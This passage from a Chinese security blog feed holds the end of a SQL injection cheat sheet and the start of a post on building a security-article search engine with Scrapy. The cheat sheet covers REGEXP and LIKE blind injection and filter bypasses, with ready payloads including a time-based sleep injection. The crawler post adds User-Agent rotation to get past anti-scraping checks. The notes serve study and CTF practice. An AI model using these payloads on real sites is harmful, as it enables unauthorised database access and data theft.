WHERE bar IN (<span class="string">' '</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/* ') AND baz = 39</span></span><br></pre></td></tr></table></figure><h2 id="REGEXP注入分析"><a href="#REGEXP注入分析" class="headerlink" title="REGEXP注入分析"></a>REGEXP注入分析</h2><p>使用场景：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了&#x3D;、in、like</span><br></pre></td></tr></table></figure><p>^若被过滤，可使用$来从后往前进行匹配</p><p>常用regexp正则语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp <span class="string">'^[a-z]'</span>  <span class="comment">#判断一个表的第一个字符串是否在a-z中</span></span><br><span class="line">regexp <span class="string">'^r'</span>      <span class="comment">#判断第一个字符串是否为r</span></span><br><span class="line">regexp <span class="string">'^r[a-z]'</span> <span class="comment">#判断一个表的第二个字符串是否在a-z中</span></span><br></pre></td></tr></table></figure><h2 id="LIKE注入分析"><a href="#LIKE注入分析" class="headerlink" title="LIKE注入分析"></a>LIKE注入分析</h2><p>like匹配<br>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。<br>1.like ‘s%’判断第一个字符是否为s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'s%'</span>,3 --+</span><br></pre></td></tr></table></figure><p>2.like ‘se%’判断前面两个字符串是否为se</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'se%'</span>,3 --+</span><br></pre></td></tr></table></figure><p>3.like ‘%sq%’ 判断是否包含se两个字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'%se%'</span>,3 --+</span><br></pre></td></tr></table></figure><p>4.like ‘_____’判断是否为5个字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'_____'</span>,3 --+</span><br></pre></td></tr></table></figure><p>5.like ‘s____’ 判断第一个字符是否为s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database() like <span class="string">'s____'</span>,3 --+</span><br></pre></td></tr></table></figure><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>详情可看：<a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98206699</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><h1 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1.使用注释符<code>/**/</code>绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/**/name/**/FROM/**/table</span><br></pre></td></tr></table></figure><p>2.使用url编码绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a0 发出去就是空格的意思，但是需要在burp中抓包后修改</span><br></pre></td></tr></table></figure><p>3.使用浮点数绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=8E0union select 1,2,3</span><br><span class="line">等价于</span><br><span class="line">select * from users <span class="built_in">where</span> id=8.0 select 1,2,3</span><br></pre></td></tr></table></figure><p>4.使用Tab替代空格<br>5.使用两个空格替代一个空格<br>6.使用括号绕过<br>如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual <span class="built_in">where</span>(1=1)and(2=2)</span><br></pre></td></tr></table></figure><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)<span class="keyword">for</span>(1)))=109))%23</span><br></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>使用16进制绕过<br>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">"users"</span></span><br></pre></td></tr></table></figure><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns <span class="built_in">where</span> table_name=0x7573657273</span><br></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><p>1.使用from关键字绕过<br>对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 <span class="keyword">for</span> 1);</span><br><span class="line">select mid(database() from 1 <span class="keyword">for</span> 1);</span><br></pre></td></tr></table></figure><p>2.使用join关键字绕过  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p>3.使用like关键字绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   <span class="comment">#等价于</span></span><br><span class="line">select user() like <span class="string">'r%'</span></span><br></pre></td></tr></table></figure><p>4.使用offset关键字绕过<br>对于limit可以使用offset来绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news <span class="built_in">limit</span> 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news <span class="built_in">limit</span> 1 offset 0</span><br></pre></td></tr></table></figure><h2 id="过滤注释符（-和-–-）"><a href="#过滤注释符（-和-–-）" class="headerlink" title="过滤注释符（ # 和 – ）"></a>过滤注释符（ # 和 – ）</h2><p>手动闭合引号，不使用注释符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1<span class="string">' union select 1,2,3||'</span>1</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1<span class="string">' union select 1,2,'</span>3</span><br></pre></td></tr></table></figure><h2 id="过滤比较符号-（-lt-和-gt-）"><a href="#过滤比较符号-（-lt-和-gt-）" class="headerlink" title="过滤比较符号 （ &lt; 和 &gt; ）"></a>过滤比较符号 （ &lt; 和 &gt; ）</h2><p>1.使用<strong>greatest()、least（）函数</strong>绕过<br>greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p><p>最常见的一个盲注的sql语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p><p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure><ol start="2"><li>使用<strong>between and</strong>绕过<br>between a and b：返回a，b之间的数据，不包含b。</li></ol><h2 id="过滤等号（-）"><a href="#过滤等号（-）" class="headerlink" title="过滤等号（ = ）"></a>过滤等号（ = ）</h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;   </p><h2 id="过滤union，select，where等"><a href="#过滤union，select，where等" class="headerlink" title="过滤union，select，where等"></a>过滤union，select，where等</h2><p>1.使用注释符绕过<br>常用注释符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//、--、/**/、<span class="comment">#、--+、---、;、%00、--a</span></span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，<span class="built_in">pwd</span> from user</span><br></pre></td></tr></table></figure><p>2.使用大小写绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure><p>3.使用内联注释绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure><p>4.使用双关键字绕过（若删除掉第一个匹配的union就能绕过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1<span class="string">'UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure><p>5.使用加号+拆解字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or <span class="string">'swords'</span> =<span class="string">'sw'</span> +<span class="string">'ords'</span> ；EXEC(<span class="string">'IN'</span> +<span class="string">'SERT INTO'</span>+<span class="string">'…..'</span> )</span><br></pre></td></tr></table></figure><p>6.使用语法新特性绕过屏蔽select<br>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p><p>TABLE 语句<br>可以直接列出表的全部内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure><p>如 select * from user 就可以用 table user 替代来进行绕过</p><p>VALUES 语句<br>可以列出一行的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line"> ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line"> value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line"> column_index</span><br></pre></td></tr></table></figure><p>例如直接列出一行的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VALUES ROW(1,2,3), ROW(4,5,6);</span><br></pre></td></tr></table></figure><p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>使用多语句的方式执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @a:=0x73656c656374202a2066726f6d2074657374;</span><br><span class="line">prepare s from @a;</span><br><span class="line">execute s;</span><br></pre></td></tr></table></figure><p><a href="https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/" target="_blank" rel="noopener">https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a>       </p><p>可看此文章<br><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a><br>参考文章:<br>史上最水的MYSQL注入总结：<a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992</a><br>sql注入总结: <a href="https://xz.aliyun.com/t/2869#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2869#toc-12</a><br>ctfwiki: <code>https://ctf-wiki.github.io/ctf-wiki/web/sqli/#_13</code><br>一种新的MySQL下Update、Insert注入方法<a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85487</a><br>解析php sprintf函数漏洞 <a href="https://blog.csdn.net/WQ_BCJ/article/details/85057447" target="_blank" rel="noopener">https://blog.csdn.net/WQ_BCJ/article/details/85057447</a></p><p>PHP sprintf格式化字符串漏洞 <a href="https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eEJPvbH7xwINjQvJGY_A_A</a><br>REGEXP注入与LIKE注入学习笔记<a href="https://xz.aliyun.com/t/8003" target="_blank" rel="noopener">https://xz.aliyun.com/t/8003</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>浅谈信安文章搜索引擎</title>
    <link href="https://blog.cfyqy.com/article/f76a9d38.html"/>
    <id>https://blog.cfyqy.com/article/f76a9d38.html</id>
    <published>2020-12-04T12:52:24.000Z</published>
    <updated>2020-12-27T03:32:54.321Z</updated>
    
    <content type="html"><![CDATA[<p>一个搜索引擎的实现流程大概为：首先获取海量的数据，整理成统一的格式，然后交给索引程序建立索引，当索引建立好后，就可以进行搜索。简而言之就是：数据获取<code>-&gt;</code>数据检索<code>-&gt;</code>数据搜索</p><a id="more"></a><h1 id="0x1数据获取"><a href="#0x1数据获取" class="headerlink" title="0x1数据获取"></a>0x1数据获取</h1><p>数据获取大概有如下两种：   </p><ul><li>爬虫定期获取：根据网站特征，写爬虫规则，定期获取想要的文章数据</li><li>网站主动推送：网站拥有者主动向搜索引擎提交文章数据</li></ul><p>搜索引擎的初期数据获取一般只能采取爬虫定期获取，当搜索引擎比较普遍使用(如谷歌、百度等)，才会有很多网站拥有者主动推送。             </p><h2 id="0x1-1爬取站点"><a href="#0x1-1爬取站点" class="headerlink" title="0x1.1爬取站点"></a>0x1.1爬取站点</h2><p>信息安全文章的站点，可以分为三类       </p><ul><li>安全社区：先知社区、安全客、嘶吼、freebuf、安全脉搏、91ri、看雪论坛、乌云知识库等</li><li>创作社区：博客园、csdn、简书、知乎、腾讯云社区等</li><li>个人博客：hexo主题博客、wordpress博客等  </li></ul><h2 id="0x1-2爬取方式"><a href="#0x1-2爬取方式" class="headerlink" title="0x1.2爬取方式"></a>0x1.2爬取方式</h2><p>在爬取之前，先弄清一下爬取的需求，每篇文章需要获取发布日期、作者、标题、正文内容、文章链接、网站域名。接着对文章重复的判断，这里主要是根据文章链接的唯一性来判断是否重复，当然有的文章可能会在多处发表，存在一小部分的重复文章，最后根据每个网站特点，写定制化爬虫。</p><p>爬取的方式可以分为两种，一种是根据网站页面特征来爬取，一种是请求数据接口来爬取。本次爬虫使用的 python 的 Scrapy 框架来演示。   </p><h3 id="0x1-2-1-网页特征"><a href="#0x1-2-1-网页特征" class="headerlink" title="0x1.2.1 网页特征"></a>0x1.2.1 网页特征</h3><p>通过观察 HTML 页面，先确定一下要爬取信息所在的位置，然后看一下该位置所处的 DOM 路径、标签元素、属性元素，找到能准确获取该信息的方式。以 hexo 的 next 主题博客为例，这个主题还是挺多师傅使用的。     </p><p>爬取思路：<br>(1). 爬取当前页面的所有文章链接<br>(2). 对页面中的每个文章链接进行爬取,得到文章相关信息<br>(3). 当前页面爬取完后，获取“下一页”,再从步骤(1)爬取</p><p>获取链接<br><img src="../../images/scrapy/secarticle/1.png" alt=""><br>获取文章信息<br><img src="../../images/scrapy/secarticle/2.png" alt=""><br>得到下一页面<br><img src="../../images/scrapy/secarticle/3.jpg" alt=""></p><p>在Scrapy 中可以使用 Scrapy shell 调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy shell article_url</span><br></pre></td></tr></table></figure><p><img src="../../images/scrapy/secarticle/4.png" alt=""></p><p>Scrapy中的Spider代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> crawlersec.items <span class="keyword">import</span> CrawlersecItem</span><br><span class="line"><span class="keyword">from</span> crawlersec.util <span class="keyword">import</span> html_entity</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SiHouSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name=<span class="string">"hexo_next"</span></span><br><span class="line">    start_urls = [<span class="string">"https://chybeta.github.io/"</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        urls=response.xpath(<span class="string">"//a[@class='post-title-link']/@href"</span>).extract()<span class="comment">#得到页面的所有文章链接</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(urls)):</span><br><span class="line">            absolute_url=parse.urljoin(response.url,urls[i])</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=absolute_url, callback=self.parse_text)</span><br><span class="line">        next_page=response.xpath(<span class="string">"//a[@class='extend next']/@href"</span>).extract_first()</span><br><span class="line">        <span class="keyword">if</span> next_page:<span class="comment">#获取下一页页面</span></span><br><span class="line">            absolute_url = parse.urljoin(response.url, next_page)</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=absolute_url, callback=self.parse)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_text</span><span class="params">(self,response)</span>:</span><span class="comment">#获取文章的相关信息</span></span><br><span class="line">        item=CrawlersecItem()</span><br><span class="line">        item[<span class="string">'url'</span>]=response.url</span><br><span class="line">        item[<span class="string">'title'</span>]=html_entity(response.css(<span class="string">".post-title::text"</span>).extract_first().strip())</span><br><span class="line">        item[<span class="string">'author'</span>]=get_author_by_url(response.url)</span><br><span class="line">        item[<span class="string">'date'</span>]=response.xpath(<span class="string">"//time/text()"</span>).extract_first().strip()</span><br><span class="line">        content=<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> text <span class="keyword">in</span> response.xpath(<span class="string">"//div[@class='post-body']//text()"</span>).extract():</span><br><span class="line">            content +=<span class="string">""</span>.join(text.split())</span><br><span class="line">        content=html_entity(content)</span><br><span class="line">        item[<span class="string">'content'</span>]=content</span><br><span class="line">        item[<span class="string">'domain'</span>]=list(parse.urlparse(response.url))[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_author_by_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    authors = &#123;<span class="string">"chybeta.github.io"</span>: <span class="string">"chybeta"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> authors[list(parse.urlparse(url))[<span class="number">1</span>]]</span><br></pre></td></tr></table></figure><h3 id="0x1-2-2-数据接口"><a href="#0x1-2-2-数据接口" class="headerlink" title="0x1.2.2 数据接口"></a>0x1.2.2 数据接口</h3><p>有些站点的文章信息是从数据接口请求而来，刚好可以直接请求数据接口获取文章的信息。例如安全客的文章：</p><p>安全客的网站结构是相对比较复杂，但点击加载更多，发现文章信息是通过请求数据接口得来的。<br>数据接口为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.anquanke.com/data/v1/posts?size=20&amp;page=1</span><br></pre></td></tr></table></figure><p>爬取思路为：<br>(1).首先获取当前数据分页中每条数据文章标题、文章id、发布日期、作者<br>(2).将获取的文章id，都加上<code>https://www.anquanke.com/post/id/</code>，得到文章链接，请求文章链接获取正文内容<br>(3).获取下一数据分页，重复步骤(1)<br><img src="../../images/scrapy/secarticle/5.png" alt=""><br><img src="../../images/scrapy/secarticle/6.png" alt="">  </p><p>Scrapy中的Spider代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> simplejson</span><br><span class="line"><span class="keyword">from</span> crawlersec.items <span class="keyword">import</span> CrawlersecItem</span><br><span class="line"><span class="keyword">from</span> crawlersec.util <span class="keyword">import</span> html_entity</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnquankeSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name=<span class="string">"anquanke"</span></span><br><span class="line">    allowed_domains=[<span class="string">"anquanke.com"</span>]</span><br><span class="line">    base_url=<span class="string">"https://www.anquanke.com/"</span></span><br><span class="line">    start_urls=[<span class="string">"https://api.anquanke.com/data/v1/posts?size=20"</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        prefix_url=<span class="string">"https://www.anquanke.com/post/id/"</span></span><br><span class="line">        res=simplejson.loads(response.text)</span><br><span class="line">        posts=res[<span class="string">'data'</span>]</span><br><span class="line">        <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">            item=CrawlersecItem()</span><br><span class="line">            item[<span class="string">'author'</span>]=post[<span class="string">'author'</span>][<span class="string">'nickname'</span>]</span><br><span class="line">            item[<span class="string">'date'</span>]=post[<span class="string">'date'</span>]</span><br><span class="line">            item[<span class="string">'title'</span>] = post[<span class="string">'title'</span>]</span><br><span class="line">            url=prefix_url+str(post[<span class="string">'id'</span>])</span><br><span class="line">            item[<span class="string">'url'</span>]=url</span><br><span class="line">            item[<span class="string">'domain'</span>]=list(parse.urlparse(self.base_url))[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=url,meta=&#123;<span class="string">'article_item'</span>:item&#125;,callback=self.parse_text)</span><br><span class="line">        next_url=res[<span class="string">'next'</span>]</span><br><span class="line">        <span class="keyword">if</span> next_url:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=next_url,callback=self.parse)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_text</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        item=response.meta.get(<span class="string">'article_item'</span>,<span class="string">''</span>)</span><br><span class="line">        content=<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> text <span class="keyword">in</span> response.xpath(<span class="string">"//text()"</span>).extract():</span><br><span class="line">            content +=<span class="string">""</span>.join(text.split())</span><br><span class="line">        content=html_entity(content)<span class="comment">#HTML entity encoding</span></span><br><span class="line">        item[<span class="string">'content'</span>]=content</span><br><span class="line">        print(item[<span class="string">'content'</span>])</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><h2 id="0x1-3-反爬策略绕过"><a href="#0x1-3-反爬策略绕过" class="headerlink" title="0x1.3 反爬策略绕过"></a>0x1.3 反爬策略绕过</h2><h3 id="0x1-3-1-User-Agent"><a href="#0x1-3-1-User-Agent" class="headerlink" title="0x1.3.1 User-Agent"></a>0x1.3.1 User-Agent</h3><p>反爬策略：网站在处理反爬的过程中，很常见的一种方式就是通过检测 User-agent 来拒绝非浏览器的访问。</p><p>绕过方式：可以维护一个 User-agent 组合列表，在发送请求时随机从列表中抽取一个，放入 Headers 请求头部里。   </p><p>可以在 Scrapy 的 middlewares.py 中自定义 RandomUserAgentMiddleware 类，并作为Download Middleware 启用。Download Middware 是引擎和下载器的中间件，每个 Request 在爬取之前都会调用其中开启的类，从而对 Request 进行一定的处理，在这里对每个请求加上随机的User-Agent</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomUserAgentMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        rand_use  = random.choice(USER_AGENT_LIST)</span><br><span class="line">        <span class="keyword">if</span> rand_use:</span><br><span class="line">            request.headers.setdefault(<span class="string">'User-Agent'</span>, rand_use)</span><br></pre></td></tr></table></figure><p>在 Scrapy 的 setting.py 中定义 USER_AGENT_LIST </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">USER_AGENT_LIST=[</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line">    <span 